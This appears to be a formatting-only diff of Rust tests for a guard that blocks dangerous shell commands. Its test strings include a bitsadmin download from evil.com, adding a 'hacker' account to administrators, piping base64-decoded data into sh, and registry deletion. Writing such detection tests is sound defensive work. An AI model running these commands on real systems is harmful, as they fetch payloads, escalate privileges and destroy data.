@@ -38,7 +38,10 @@ fn test_dynamic_entries() {
 
 #[test]
 fn test_strict_mode() {
-    let guard = Guard::with_config(GuardConfig { strict_mode: true, ..Default::default() });
+    let guard = Guard::with_config(GuardConfig {
+        strict_mode: true,
+        ..Default::default()
+    });
     assert!(guard.check("rm - something").is_err());
 }
 
@@ -106,7 +109,9 @@ fn test_guard_config_default() {
 #[test]
 fn test_add_remove_entry_roundtrip() {
     let guard = Guard::new(true);
-    guard.add_entry("test_rule", r"(?i)test_pattern_\d+").unwrap();
+    guard
+        .add_entry("test_rule", r"(?i)test_pattern_\d+")
+        .unwrap();
     assert!(guard.check("test_pattern_42").is_err());
     assert!(guard.remove_entry("test_rule"));
     assert!(guard.check("test_pattern_42").is_ok());
@@ -132,7 +137,10 @@ fn test_add_duplicate_entry_replaces() {
 #[test]
 fn test_non_strict_mode_rm_with_space() {
     // In non-strict mode, "rm - something" might be allowed
-    let config = GuardConfig { strict_mode: false, ..Default::default() };
+    let config = GuardConfig {
+        strict_mode: false,
+        ..Default::default()
+    };
     let guard_non_strict = Guard::with_config(config);
     // This depends on implementation - just ensure no panic
     let _ = guard_non_strict.check("rm - something");
@@ -257,9 +265,17 @@ fn test_all_windows_commands() {
     assert!(guard.check("reg delete HKLM\\Software\\Key").is_err());
     assert!(guard.check("reg add HKLM\\Software\\Key").is_err());
     assert!(guard.check("net user hacker password /add").is_err());
-    assert!(guard.check("net localgroup administrators hacker /add").is_err());
+    assert!(
+        guard
+            .check("net localgroup administrators hacker /add")
+            .is_err()
+    );
     assert!(guard.check("wmic process list").is_err());
-    assert!(guard.check("bitsadmin /transfer job http://evil.com/file C:\\file").is_err());
+    assert!(
+        guard
+            .check("bitsadmin /transfer job http://evil.com/file C:\\file")
+            .is_err()
+    );
 }
 
 #[test]
@@ -284,17 +300,33 @@ fn test_all_disk_commands() {
 fn test_all_obfuscation_commands() {
     let guard = Guard::new(true);
     assert!(guard.check("echo base64data | base64 -d | sh").is_err());
-    assert!(guard.check("python3 -c import os; os.system('id')").is_err());
+    assert!(
+        guard
+            .check("python3 -c import os; os.system('id')")
+            .is_err()
+    );
     assert!(guard.check("python -c exec('code')").is_err());
 }
 
 #[test]
 fn test_get_category_known() {
-    assert_eq!(Guard::get_category("rm_rf"), Some(CommandCategory::Destructive));
-    assert_eq!(Guard::get_category("sudo"), Some(CommandCategory::Privilege));
+    assert_eq!(
+        Guard::get_category("rm_rf"),
+        Some(CommandCategory::Destructive)
+    );
+    assert_eq!(
+        Guard::get_category("sudo"),
+        Some(CommandCategory::Privilege)
+    );
     assert_eq!(Guard::get_category("nmap"), Some(CommandCategory::Recon));
-    assert_eq!(Guard::get_category("eval"), Some(CommandCategory::Obfuscation));
-    assert_eq!(Guard::get_category("curl_pipe_sh"), Some(CommandCategory::Network));
+    assert_eq!(
+        Guard::get_category("eval"),
+        Some(CommandCategory::Obfuscation)
+    );
+    assert_eq!(
+        Guard::get_category("curl_pipe_sh"),
+        Some(CommandCategory::Network)
+    );
 }
 
 #[test]
@@ -342,11 +374,13 @@ fn test_with_config_invalid_extra_pattern() {
 #[test]
 fn test_set_config_adds_patterns() {
     let guard = Guard::new(true);
-    guard.set_config(GuardConfig {
-        enabled: true,
-        strict_mode: false,
-        extra_patterns: vec![r"(?i)new_pattern_\d+".to_string()],
-    }).unwrap();
+    guard
+        .set_config(GuardConfig {
+            enabled: true,
+            strict_mode: false,
+            extra_patterns: vec![r"(?i)new_pattern_\d+".to_string()],
+        })
+        .unwrap();
     assert!(guard.check("new_pattern_99").is_err());
 }
 
@@ -370,13 +404,19 @@ fn test_add_entry_invalid_regex() {
 #[test]
 fn test_severity_serialization() {
     assert_eq!(serde_json::to_string(&Severity::Low).unwrap(), "\"Low\"");
-    assert_eq!(serde_json::to_string(&Severity::Critical).unwrap(), "\"Critical\"");
+    assert_eq!(
+        serde_json::to_string(&Severity::Critical).unwrap(),
+        "\"Critical\""
+    );
 }
 
 #[test]
 fn test_platform_serialization() {
     assert_eq!(serde_json::to_string(&Platform::All).unwrap(), "\"All\"");
-    assert_eq!(serde_json::to_string(&Platform::Windows).unwrap(), "\"Windows\"");
+    assert_eq!(
+        serde_json::to_string(&Platform::Windows).unwrap(),
+        "\"Windows\""
+    );
 }
 
 #[test]
